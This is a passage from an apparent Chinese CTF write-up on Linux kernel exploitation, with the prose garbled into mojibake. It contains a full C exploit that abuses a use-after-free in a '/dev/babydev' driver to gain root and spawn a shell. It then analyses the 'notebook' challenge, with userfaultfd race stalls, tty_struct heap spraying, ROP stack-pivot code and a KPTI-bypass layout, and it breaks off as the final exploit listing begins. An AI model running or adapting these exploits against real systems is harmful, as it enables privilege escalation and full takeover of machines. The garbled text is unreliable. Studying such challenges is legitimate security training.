ï¼‰ï¼Œæ•…è¿™é‡Œä¾¿<strong>ä¸å†è€ƒè™‘</strong>ä»¥å‰æ—§çš„åšæ³•ï¼Œæ„Ÿå…´è¶£çš„å‚è€ƒå¦‚ä¸‹expï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br><br>    <span class="hljs-keyword">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>);<br>    close(fd1);<br><br>    <span class="hljs-keyword">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Unable to fork the new thread, exploit failed.\033[0m\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>) <span class="hljs-comment">// the child thread</span><br>    &#123;<br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        write(fd2, buf, <span class="hljs-number">28</span>);<br><br>        <span class="hljs-keyword">if</span>(getuid() == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>            system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Unable to get the root, exploit failed.\033[0m\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">// the parent thread</span><br>    &#123;<br>        wait(<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//waiting for the child</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></blockquote></blockquote><h1 id="å†…æ ¸å †å–·-heap-spraying"><a href="#å†…æ ¸å †å–·-heap-spraying" class="headerlink" title="å†…æ ¸å †å–·(heap spraying)"></a>å†…æ ¸å †å–·(heap spraying)</h1><p><strong>å †å–·å°„</strong>ï¼ˆheap sprayingï¼‰æŒ‡çš„æ˜¯ä¸€ç§è¾…åŠ©æ”»å‡»æ‰‹æ³•ï¼šã€Œ<strong>é€šè¿‡å¤§é‡çš„åˆ†é…ç›¸åŒçš„ç»“æ„ä½“æ¥è¾¾æˆæŸç§ç‰¹å®šçš„å†…å­˜å¸ƒå±€</strong>ï¼Œä»è€Œå¸®åŠ©æ”»å‡»è€…å®Œæˆåç»­çš„åˆ©ç”¨è¿‡ç¨‹ã€ï¼Œå¸¸è§äºå¦‚ä¸‹åœºæ™¯ï¼š</p><ul><li>ä½ æœ‰ä¸€ä¸ª UAFï¼Œä½†æ˜¯<strong>è¯¥ object ä¸å±äºå½“å‰ freelist ï¼Œé‡Šæ”¾åä¼šå›åˆ° node ä¸Š</strong>ï¼Œè¿™æ—¶ä½ å¯ä»¥é€šè¿‡å †å–·å°„æ¥ç¡®ä¿æ‹¿åˆ°è¯¥ object</li><li>ä½ æœ‰ä¸€ä¸ªå †æº¢å‡ºï¼Œä½†æ˜¯<strong>å †å¸ƒå±€å¯¹ä½ è€Œè¨€æ˜¯ä¸å¯çŸ¥çš„</strong>ï¼ˆæ¯”å¦‚è¯´å¼€å¯äº† <code>SLAB_FREELIST_RANDOM</code>ï¼ˆé»˜è®¤å¼€å¯ï¼‰ï¼‰ï¼Œä½ å¯ä»¥é¢„å…ˆå–·å°„å¤§é‡ç‰¹å®šç»“æ„ä½“ï¼Œä»è€Œä¿è¯å¯¹å…¶ä¸­æŸä¸ªç»“æ„ä½“çš„æº¢å‡º</li><li>â€¦â€¦</li></ul><h2 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ›-notebook"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ›-notebook" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ› - notebook"></a><em>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ› - notebook</em></h2><h3 id="ç®€å•åˆ†æ"><a href="#ç®€å•åˆ†æ" class="headerlink" title="ç®€å•åˆ†æ"></a>ç®€å•åˆ†æ</h3><p>é¦–å…ˆçœ‹ä¸€ä¸‹å¯åŠ¨è„šæœ¬ï¼ˆ<del>å†™å¾—å¾ˆ tmd ä¹±ï¼Œæ—©è¯¥é”¤é”¤å‡ºé¢˜äººäº†</del>ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>stty intr ^]<br>exec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append &quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot; -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s<br></code></pre></div></td></tr></table></figure><p>å¼€äº† smapã€smepã€kaslr ä¿æŠ¤</p><p>æŸ¥çœ‹ <code>/sys/devices/system/cpu/vulnerabilities/*</code></p><p><a href="https://i.loli.net/2021/09/10/TuDM8B52agPXiI4.png"><img src="https://s2.loli.net/2023/02/06/MgqowIeJrQWcEhm.png" alt="image.png"></a></p><p>å¼€å¯äº† KPTI ï¼ˆå†…æ ¸é¡µè¡¨éš”ç¦»ï¼‰</p><p>ç»™äº†ä¸€ä¸ª LKM å« <code>notebook.ko</code>ï¼ŒæŒ‰æƒ¯ä¾‹è¿™åº”å½“å°±æ˜¯æœ‰æ¼æ´çš„æ¨¡å—äº†ï¼Œæ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p><p>å¤§è‡´æ˜¯åˆ›å»ºäº†ä¸€ä¸ª misc ç±»å‹çš„è®¾å¤‡ï¼Œå¹¶è‡ªå®šä¹‰äº† ioctlã€readã€write ä¸‰ä¸ªæ¥å£</p><p><a href="https://i.loli.net/2021/06/22/Ve8ifgAOLomTj4H.png"><img src="https://s2.loli.net/2023/02/06/sfwuprjn8bgJ37B.png" alt="image.png"></a></p><h4 id="1ï¼‰note-ç»“æ„ä½“"><a href="#1ï¼‰note-ç»“æ„ä½“" class="headerlink" title="1ï¼‰note ç»“æ„ä½“"></a>1ï¼‰note ç»“æ„ä½“</h4><p>å®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“ <code>note</code>ï¼Œæœ‰ç€ä¸¤ä¸ªæˆå‘˜ï¼šsize å­˜å‚¨ cache çš„å¤§å°ï¼Œbuf å­˜å‚¨æŒ‡å‘å¯¹åº” cache çš„æŒ‡é’ˆ</p><p><a href="https://i.loli.net/2021/06/22/eM1Dknsi8qPXIF7.png"><img src="https://s2.loli.net/2023/02/06/cLGKsM8TaSDRIfj.png" alt="image.png"></a></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125;note;<br></code></pre></div></td></tr></table></figure><h4 id="2ï¼‰mynote-ioctl"><a href="#2ï¼‰mynote-ioctl" class="headerlink" title="2ï¼‰mynote_ioctl"></a>2ï¼‰mynote_ioctl</h4><p>å¯¹äº ioctl é€šä¿¡ï¼Œè¯¥æ¨¡å—æ¨¡æ‹Ÿäº†ä¸€ä¸ªèœå•ï¼ˆ<del>åˆæ˜¯èœå•å †</del>ï¼‰ï¼Œæä¾›äº†åˆ›å»ºã€ç¼–è¾‘ã€é‡Šæ”¾å†…å­˜çš„åŠŸèƒ½</p><p><a href="https://i.loli.net/2021/06/22/ebcs7dqulX152fg.png"><img src="https://s2.loli.net/2023/02/06/bhZCpKUvViXzL9r.png" alt="image.png"></a></p><p>æˆ‘ä»¬éœ€è¦ä¼ å…¥çš„å‚æ•°ä¸ºå¦‚ä¸‹ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> idx;<br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125;userarg;<br></code></pre></div></td></tr></table></figure><h5 id="noteadd"><a href="#noteadd" class="headerlink" title="noteadd()"></a>noteadd()</h5><p>noteadd() ä¼šå‘ slub ç”³è¯· objectï¼Œå…¶ä¸­é™åˆ¶äº†æˆ‘ä»¬åªèƒ½å¤Ÿåˆ†é… 0x60 ä»¥ä¸‹çš„ noteï¼Œæ­¤æ—¶ä¸ä¼šç›´æ¥å°†ç”¨æˆ·æ•°æ®æ‹·è´åˆ°åˆšåˆ†é…çš„ note ä¸­ï¼Œè€Œæ˜¯æ‹·è´åˆ°å…¨å±€å˜é‡å­—ç¬¦æ•°ç»„ <code>name</code> ä¸­</p><p><a href="https://i.loli.net/2021/06/22/6HVQLpBYk1S5EtK.png"><img src="https://s2.loli.net/2023/02/06/I9wg3d5K4mFRWPV.png" alt="image.png"></a></p><h5 id="notedel"><a href="#notedel" class="headerlink" title="notedel()"></a>notedel()</h5><p>è¿™ä¸ªå‡½æ•°ä¸»è¦ç”¨å¤„æ˜¯é‡Šæ”¾å…ˆå‰åˆ†é…çš„ note</p><p>æ³¨æ„åˆ°åœ¨ notedel() å‡½æ•°ä¸­è‹¥æ˜¯ size ä¸º 0 åˆ™ä¸ä¼šæ¸…ç©ºï¼Œä¸è¿‡ä¸ ptmalloc æ‰€ä¸åŒçš„æ˜¯ï¼Œkmalloc(0) å¹¶ä¸ä¼šè¿”å› object</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªè¯»å†™é”ï¼Œä¸è¿‡ add å’Œ edit å ç”¨çš„æ˜¯<strong>è¯»</strong>ä½ï¼Œè€Œ delete å ç”¨çš„æ˜¯<strong>å†™</strong>ä½ï¼Œé€šä¿—åœ°è¯´ä¾¿æ˜¯ï¼šè¯»é”å¯ä»¥è¢«å¤šä¸ªè¿›ç¨‹ä½¿ç”¨ï¼Œå¤šä¸ªè¿›ç¨‹æ­¤æ—¶å¯ä»¥åŒæ—¶è¿›å…¥ä¸´ç•ŒåŒºï¼Œè€Œå†™é”åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨ï¼Œåªæœ‰ä¸€ä¸ªè¿›ç¨‹èƒ½å¤Ÿè¿›å…¥ä¸´ç•ŒåŒº</p><p><a href="https://i.loli.net/2021/06/22/voBxLYPGEf9slDz.png"><img src="https://s2.loli.net/2023/02/06/piHZNTxkjOryE5o.png" alt="image.png"></a></p><h5 id="noteedit"><a href="#noteedit" class="headerlink" title="noteedit()"></a>noteedit()</h5><p>ç¼–è¾‘æˆ‘ä»¬çš„ notebook ä¸­çš„ objectï¼Œè‹¥æ˜¯ size ä¸åŒåˆ™ä¼šè°ƒç”¨ kreallocï¼Œå¹¶å°†ç”¨æˆ·ç©ºé—´æ•°æ®æ‹·è´ 256 å­—èŠ‚è‡³å…¨å±€å˜é‡ name ä¸­ï¼Œå¦åˆ™ç›´æ¥è¿”å›ï¼Œä¸ add æ‰€ä¸åŒçš„æ˜¯ edit å¹¶ä¸ä¼šé™åˆ¶ size å¤§å°ï¼Œå› æ­¤<strong>è™½ç„¶ add é™åˆ¶äº† sizeï¼Œä½†æ˜¯é€šè¿‡ edit æˆ‘ä»¬ä»èƒ½è·å¾—ä»»æ„å¤§å°çš„ object</strong></p><p>åœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼šedit ä½¿ç”¨çš„æ˜¯è¯»é”ï¼Œå¯ä»¥å¤šä¸ªè¿›ç¨‹å¹¶å‘ <code>realloc(buf, 0)</code> ï¼Œé€šè¿‡æ¡ä»¶ç«äº‰è¾¾åˆ° double free çš„æ•ˆæœ</p><p><a href="https://i.loli.net/2021/07/31/2Q4vezhdZy61sAf.png"><img src="https://s2.loli.net/2023/02/06/4btxwPQWcn8srXT.png" alt="image.png"></a></p><h5 id="notegift"><a href="#notegift" class="headerlink" title="notegift()"></a>notegift()</h5><p>notegift() å‡½æ•°ä¼šç™½ç»™å‡ºåˆ†é…çš„ note çš„åœ°å€</p><p><a href="https://i.loli.net/2021/06/22/1eUIDfFAsaqyOmY.png"><img src="https://s2.loli.net/2023/02/06/k1ypdVtBboeSlha.png" alt="image.png"></a></p><h4 id="3ï¼‰mynote-read"><a href="#3ï¼‰mynote-read" class="headerlink" title="3ï¼‰mynote_read"></a>3ï¼‰mynote_read</h4><p>å¾ˆæ™®é€šçš„è¯»å–å¯¹åº” note å†…å®¹çš„åŠŸèƒ½ï¼Œè¯»å–çš„å¤§å°ä¸º notebook ç»“æ„ä½“æ•°ç»„ä¸­å­˜çš„ sizeï¼Œä¸‹æ ‡ä¸º read ä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°</p><p><a href="https://i.loli.net/2021/06/22/m2XhBYuUbKVElH4.png"><img src="https://s2.loli.net/2023/02/06/Th1cKDv7JnyIx4Z.png" alt="image.png"></a></p><h4 id="4ï¼‰mynote-write"><a href="#4ï¼‰mynote-write" class="headerlink" title="4ï¼‰mynote_write"></a>4ï¼‰mynote_write</h4><p>å¾ˆæ™®é€šçš„å†™å…¥å¯¹åº” note å†…å®¹çš„åŠŸèƒ½ï¼Œå†™å…¥çš„å¤§å°ä¸º notebook ç»“æ„ä½“æ•°ç»„ä¸­å­˜çš„ sizeï¼Œä¸‹æ ‡ä¸º write ä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°</p><p><a href="https://i.loli.net/2021/06/22/dMnI7hjfyQrZmC4.png"><img src="https://s2.loli.net/2023/02/06/5zpJaMri3Fb1xtB.png" alt="image.png"></a></p><h3 id="è§£æ³•ä¸€ï¼šuserfaultfd-heap-spray-Kernel-UAF-stack-migration-KPTI-bypass"><a href="#è§£æ³•ä¸€ï¼šuserfaultfd-heap-spray-Kernel-UAF-stack-migration-KPTI-bypass" class="headerlink" title="è§£æ³•ä¸€ï¼šuserfaultfd + heap spray + Kernel UAF + stack migration + KPTI bypass"></a>è§£æ³•ä¸€ï¼šuserfaultfd + heap spray + Kernel UAF + stack migration + KPTI bypass</h3><h4 id="1ï¼‰userfaultfd-æ„é€ -UAF"><a href="#1ï¼‰userfaultfd-æ„é€ -UAF" class="headerlink" title="1ï¼‰userfaultfd æ„é€  UAF"></a>1ï¼‰userfaultfd æ„é€  UAF</h4><p>è€ƒè™‘åˆ°åœ¨ mynote_edit å½“ä¸­ä½¿ç”¨äº† krealloc æ¥é‡åˆ†é… objectï¼Œéšåä½¿ç”¨ copy_fom_user ä»ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆåˆ†é…ä¸€ä¸ª tty_struct å¤§å°çš„ noteï¼Œä¹‹å<strong>æ–°å¼€ edit çº¿ç¨‹é€šè¿‡ krealloc ä¸€ä¸ªè¾ƒå¤§çš„æ•°å°†å…¶é‡Šæ”¾</strong>ï¼Œå¹¶é€šè¿‡ userfaultfd è®© mynote_edit å¡åœ¨è¿™é‡Œï¼Œ<strong>æ­¤æ—¶ notebook æ•°ç»„ä¸­çš„ object å°šæœªè¢«æ¸…ç©ºï¼Œä»æ˜¯åŸå…ˆè¢«é‡Šæ”¾äº†çš„ object</strong></p><p><a href="https://i.loli.net/2021/09/09/LMEmgrIGoUjwDJ2.png"><img src="https://s2.loli.net/2023/02/06/b4gY3VxPRstlXvJ.png" alt="image.png"></a></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¿›è¡Œ<strong>å †å–·å°„</strong>ï¼šå¤šæ¬¡æ‰“å¼€ <code>/dev/ptmx</code>ï¼Œç”±æ­¤æˆ‘ä»¬ä¾¿æœ‰å¯èƒ½<strong>å°†åˆšé‡Šæ”¾çš„ object ç”³è¯·åˆ° tty_struct ä¸­</strong></p><p>ä½†åœ¨ read å’Œ write ä¸­éƒ½ä¼šç”¨ <code>_check_object_size</code> æ£€æŸ¥ size ä¸ buf å¤§å°æ˜¯å¦åŒ¹é…ï¼Œåœ¨ mynote_add å½“ä¸­é™åˆ¶äº† size åº”å½“ä¸å¤§äº 0x60ï¼Œè€Œæˆ‘ä»¬åœ¨ mynote_edit ä¸­çš„é‡Šæ”¾æ“ä½œä¹‹å‰ä¼šå°† size æ”¹æ‰</p><p><a href="https://i.loli.net/2021/09/09/h7TiZGbxfuqOc2B.png"><img src="https://s2.loli.net/2023/02/06/iWfUJgS4cTPyYAp.png" alt="image.png"></a></p><p>è€ƒè™‘åˆ°åœ¨ mynote_add ä¸­å…ˆç”¨ copy_from_user æ‹·è´æ•°æ®åæ‰è°ƒç”¨ kmallocï¼Œæ•…è¿™é‡Œè¿˜æ˜¯å¯ä»¥æ–°å¼€ add çº¿ç¨‹è®© size åˆæ³•åé€šè¿‡ userfaultfd è®©å…¶å¡åœ¨è¿™é‡Œ</p><p><a href="https://i.loli.net/2021/09/09/J4m6VTr3kAwZoX8.png"><img src="https://s2.loli.net/2023/02/06/W7RvALhlrTnZbcx.png" alt="image.png"></a></p><blockquote><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ£€æŸ¥ object å¼€å¤´çš„æ•°æ®æ˜¯å¦ä¸º tty é­”æ•° <code>0x5401</code> åˆ¤æ–­æ˜¯å¦åˆ†é…åˆ°äº† tty_struct</p></blockquote><h4 id="2ï¼‰æ³„éœ²å†…æ ¸åœ°å€"><a href="#2ï¼‰æ³„éœ²å†…æ ¸åœ°å€" class="headerlink" title="2ï¼‰æ³„éœ²å†…æ ¸åœ°å€"></a>2ï¼‰æ³„éœ²å†…æ ¸åœ°å€</h4><p>ç”±äºæˆ‘ä»¬å·²ç»è·å¾—äº†ä¸€ä¸ª tty_structï¼Œæ•…å¯ä»¥ç›´æ¥é€šè¿‡ tty_struct ä¸­çš„ tty_operations æ³„éœ²åœ°å€</p><h5 id="ptm-unix98-ops-amp-amp-pty-unix98-ops"><a href="#ptm-unix98-ops-amp-amp-pty-unix98-ops" class="headerlink" title="ptm_unix98_ops &amp;&amp; pty_unix98_ops"></a>ptm_unix98_ops &amp;&amp; pty_unix98_ops</h5><p>åœ¨ ptmx è¢«æ‰“å¼€æ—¶å†…æ ¸é€šè¿‡ <code>alloc_tty_struct()</code> åˆ†é… tty_struct çš„å†…å­˜ç©ºé—´ï¼Œä¹‹åä¼šå°† tty_operations åˆå§‹åŒ–ä¸º<strong>å…¨å±€å˜é‡</strong> <code>ptm_unix98_ops</code> æˆ– <code>pty_unix98_ops </code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ tty_operations æ¥æ³„éœ²å†…æ ¸åŸºå€</p><blockquote><p>åœ¨è°ƒè¯•é˜¶æ®µæˆ‘ä»¬å¯ä»¥å…ˆå…³æ‰ kaslr å¼€ root ä» <code>/proc/kallsyms</code> ä¸­è¯»å–å…¶åç§»</p></blockquote><p>å¼€å¯äº† kaslr çš„å†…æ ¸åœ¨å†…å­˜ä¸­çš„åç§»ä¾ç„¶ä»¥å†…å­˜é¡µä¸ºç²’åº¦ï¼Œæ•…æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¯”å¯¹ tty_operations åœ°å€çš„ä½ä¸‰16è¿›åˆ¶ä½æ¥åˆ¤æ–­æ˜¯ ptm_unix98_ops è¿˜æ˜¯ pty_unix98_ops</p><h4 id="3ï¼‰åŠ«æŒ-tty-operations"><a href="#3ï¼‰åŠ«æŒ-tty-operations" class="headerlink" title="3ï¼‰åŠ«æŒ tty_operations"></a>3ï¼‰åŠ«æŒ tty_operations</h4><p>ç”±äºé¢˜ç›®å¼€å¯äº† smap ä¿æŠ¤ï¼Œæˆ‘ä»¬ä¸èƒ½å¤Ÿç›´æ¥å°† fake tty_operations æ”¾ç½®åˆ°ç”¨æˆ·ç©ºé—´å½“ä¸­ï¼Œä½† notegift() ä¼šç™½ç»™å‡º notebook é‡Œå­˜çš„ note çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠ fake tty_operations å¸ƒç½®åˆ° note å½“ä¸­</p><p>æ¥ä¸‹æ¥è¿›è¡Œæ ˆè¿ç§»çš„å·¥ä½œï¼Œæˆ‘ä»¬è¿™é‡Œè€ƒè™‘åŠ«æŒ tty_operations-&gt;writeï¼Œç®€å•ä¸‹ä¸ªæ–­ç‚¹çœ‹çœ‹ç¯å¢ƒï¼š</p><p><a href="https://i.loli.net/2021/09/09/VwIjzT4D7aNmuqZ.png"><img src="https://s2.loli.net/2023/02/06/R6OrzTpFMV5isKe.png" alt="image.png"></a></p><p>å¯ä»¥å‘ç°å½“ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œæ—¶ rdi å¯„å­˜å™¨ä¸­å­˜å‚¨çš„åˆšå¥½æ˜¯ tty_struct çš„åœ°å€ï¼Œç¬”è€…é€‰æ‹©é€šè¿‡ä¸‹é¢è¿™æ¡ gadget å°†æ ˆè¿ç§»åˆ° tty_structï¼š</p><p><a href="https://i.loli.net/2021/09/09/Jkgyl5NnrPEjfiV.png"><img src="https://s2.loli.net/2023/02/06/vUQj85sMo9nptbE.png" alt="image.png"></a></p><p>tty_struct æ¯”è¾ƒå°ï¼Œè€Œä¸”å¾ˆå¤šæ•°æ®ä¸èƒ½åŠ¨ï¼Œè¿™é‡Œç¬”è€…å†è¿›è¡Œç¬¬äºŒæ¬¡æ ˆè¿ç§»è¿å› tty_operationsï¼š</p><p><a href="https://i.loli.net/2021/09/09/R3bm6E8dzv5CayG.png"><img src="https://s2.loli.net/2023/02/06/UDp7EwLdkNWs4aJ.png" alt="image.png"></a></p><p>tty_operation å¼€å¤´åˆ° write çš„ç©ºé—´æ¯”è¾ƒå°ï¼Œç¬”è€…é€‰æ‹©å†è¿›è¡Œç¬¬ä¸‰æ¬¡æ ˆè¿ç§»åˆ°ä¸€ä¸ª note ä¸­ï¼Œåœ¨é‚£é‡Œå®Œæˆæˆ‘ä»¬çš„ ROP</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">// first migration to tty_struct</span><br>((struct tty_operations *)fake_tty_ops_data)-&gt;write = PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;<br><br><span class="hljs-comment">// second migration back to tty_operations</span><br>fake_tty_data[<span class="hljs-number">1</span>] = POP_RBX_POP_RBP_RET + kernel_offset;<br>fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>fake_tty_data[<span class="hljs-number">4</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br><br><span class="hljs-comment">// third migration to a note</span><br>fake_tty_ops_data[<span class="hljs-number">1</span>] = POP_RBP_RET + kernel_offset;<br>fake_tty_ops_data[<span class="hljs-number">2</span>] = notebook[fake_stack_idx].buf;<br>fake_tty_ops_data[<span class="hljs-number">3</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br></code></pre></div></td></tr></table></figure><h4 id="4ï¼‰KPTI-bypass"><a href="#4ï¼‰KPTI-bypass" class="headerlink" title="4ï¼‰KPTI bypass"></a>4ï¼‰KPTI bypass</h4><p>ç”±äºå¼€å¯äº† KPTIï¼ˆå†…æ ¸é¡µè¡¨éš”ç¦»ï¼‰ï¼Œæ•…æˆ‘ä»¬åœ¨è¿”å›ç”¨æˆ·æ€ä¹‹å‰è¿˜éœ€è¦å°†æˆ‘ä»¬çš„ç”¨æˆ·è¿›ç¨‹çš„é¡µè¡¨ç»™åˆ‡æ¢å›æ¥</p><p>åœ¨è¿™é‡Œç›´æ¥ä½¿ç”¨å†…æ ¸ç”¨äºå®Œæˆå†…æ ¸æ€åˆ°ç”¨æˆ·æ€åˆ‡æ¢çš„å‡½æ•° <code>swapgs_restore_regs_and_return_to_usermode</code>ï¼Œåœ°å€å¯ä»¥åœ¨ <code>/proc/kallsyms</code> ä¸­è·å¾—</p><p>å¸ƒç½®å‡ºå¦‚ä¸‹æ ˆå¸ƒå±€å³å¯</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs AWK">â†“    swapgs_restore_regs_and_return_to_usermode<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    user_shell_addr<br>    user_cs<br>    user_rflags<br>    user_sp<br>    user_ss<br></code></pre></div></td></tr></table></figure><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><blockquote><p>exp.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 